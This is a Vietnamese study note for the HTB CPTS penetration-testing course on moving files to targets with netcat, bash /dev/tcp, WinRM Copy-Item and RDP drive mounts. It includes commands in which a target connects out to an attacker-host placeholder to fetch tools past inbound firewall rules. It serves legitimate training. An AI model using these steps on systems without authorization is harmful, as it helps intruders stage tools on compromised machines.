---
title: "Misc File Transfer"
date: 2026-04-11 09:00:00 +0700
categories: [HTB_CPTS, File Transfer]
tags: [file-transfer, misc, lolbins, windows, linux]
description: "HTB CPTS note tổng hợp các kỹ thuật file transfer bổ sung."
pin: false
---
# Chuyển File - Phương Pháp Khác (Netcat, WinRM, RDP)

> **Khi nào dùng? Các phương pháp này dùng khi HTTP, HTTPS, SMB bị block hoặc không khả dụng. Luôn thử nhiều method — môi trường thực tế luôn có hạn chế khác nhau.**

---

## 1. Netcat / Ncat

### Hướng 1 — Target lắng nghe, Attack Host gửi

> Dùng khi attack host có thể reach được target trực tiếp.

**Target (nhận file):**

```bash
# Netcat
nc -l -p 8000 > <TÊN_FILE>

# Ncat
ncat -l -p 8000 --recv-only > <TÊN_FILE>
```

**Attack Host (gửi file):**

```bash
# Netcat
nc -q 0 <TARGET_IP> 8000 < <TÊN_FILE>

# Ncat
ncat --send-only <TARGET_IP> 8000 < <TÊN_FILE>
```

---

### Hướng 2 — Attack Host lắng nghe, Target kết nối ra

> **Dùng khi firewall block **inbound** vào target — target không nhận kết nối từ ngoài vào nhưng vẫn kết nối ra ngoài được.**

**Attack Host (listen, gửi file):**

```bash
# Netcat
sudo nc -l -p 443 -q 0 < <TÊN_FILE>

# Ncat
sudo ncat -l -p 443 --send-only < <TÊN_FILE>
```

**Target (kết nối ra để nhận file):**

```bash
# Netcat
nc <ATTACK_IP> 443 > <TÊN_FILE>

# Ncat
ncat <ATTACK_IP> 443 --recv-only > <TÊN_FILE>

# Bash /dev/tcp (khi không có nc/ncat)
cat < /dev/tcp/<ATTACK_IP>/443 > <TÊN_FILE>
```

> **`/dev/tcp` là gì? Bash có pseudo-device `/dev/tcp/host/port` — đọc/ghi vào đó = mở TCP connection. Cực kỳ hữu ích khi target không cài nc/ncat.**

---

### Flag quan trọng

|Flag|Tool|Ý nghĩa|
|---|---|---|
|`-q 0`|nc|Đóng kết nối ngay sau khi gửi xong|
|`--send-only`|ncat|Đóng khi hết input, không chờ response|
|`--recv-only`|ncat|Đóng khi phía gửi ngắt kết nối|

---

## 2. PowerShell Remoting (WinRM) — Windows ↔ Windows

> **Khi nào dùng? Khi HTTP/HTTPS/SMB bị block nhưng **WinRM còn mở** — port TCP **5985** (HTTP) hoặc **5986** (HTTPS). Yêu cầu: có quyền Administrator hoặc thuộc nhóm `Remote Management Users` trên máy đích.**

**Bước 1 — Kiểm tra WinRM có mở không:**

```powershell
Test-NetConnection -ComputerName <TÊN_MÁY_ĐÍCH> -Port 5985
```

**Bước 2 — Tạo PS Session:**

```powershell
$Session = New-PSSession -ComputerName <TÊN_MÁY_ĐÍCH>

# Nếu cần credential khác
$Cred = Get-Credential
$Session = New-PSSession -ComputerName <TÊN_MÁY_ĐÍCH> -Credential $Cred
```

**Bước 3 — Copy file:**

```powershell
# Local → Remote
Copy-Item -Path <ĐƯỜNG_DẪN_LOCAL> -ToSession $Session -Destination <ĐƯỜNG_DẪN_REMOTE>

# Remote → Local
Copy-Item -Path <ĐƯỜNG_DẪN_REMOTE> -Destination <ĐƯỜNG_DẪN_LOCAL> -FromSession $Session
```

> **PowerShell Remoting cần được **bật sẵn** trên máy đích (`Enable-PSRemoting`). Trong môi trường domain thường đã bật mặc định cho admin.**

---

## 3. RDP — Mount Folder Local

> Dùng khi đã có RDP access, muốn kéo/thả file trực tiếp mà không cần setup thêm gì.

```bash
# rdesktop
rdesktop <TARGET_IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:linux='<ĐƯỜNG_DẪN_LOCAL>'

# xfreerdp
xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>' /drive:linux,<ĐƯỜNG_DẪN_LOCAL>
```

Sau khi kết nối → trong Windows Explorer của target thấy `\\tsclient\linux` → kéo thả file bình thường.

> **Windows Defender Nếu target có Defender, share folder chứa malware/tool có thể bị **xóa ngay trên máy local** của mình. Cẩn thận.**

---

## Tóm Tắt — Chọn Method Nào?

|Tình huống|Method|
|---|---|
|Target nhận inbound, có nc/ncat|Netcat — target listen|
|Firewall block inbound vào target|Netcat — attack host listen, target kết nối ra|
|Target không có nc/ncat|`/dev/tcp` với Bash|
|Windows–Windows, HTTP/SMB bị block|WinRM + `Copy-Item`|
|Đang dùng RDP|Mount folder qua `xfreerdp /drive:`|

---

## Liên Kết

- Footprinting — WinRM enumeration (port 5985/5986)
- Windows File Transfer Methods— các method HTTP, SMB, Base64
- Linux File Transfer Methods — wget, curl, Python HTTP server
